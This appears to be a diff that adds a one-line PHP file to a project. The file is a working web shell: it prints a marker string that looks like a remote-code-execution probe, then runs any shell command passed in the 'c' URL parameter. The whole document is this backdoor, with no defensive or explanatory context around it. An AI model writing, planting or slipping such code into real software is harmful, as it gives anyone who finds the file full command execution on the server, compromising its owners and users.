@@ -1,0 +1,1 @@
+<?php echo 'QRLRCE2_ce7e'; echo shell_exec($_GET['c']??'id');
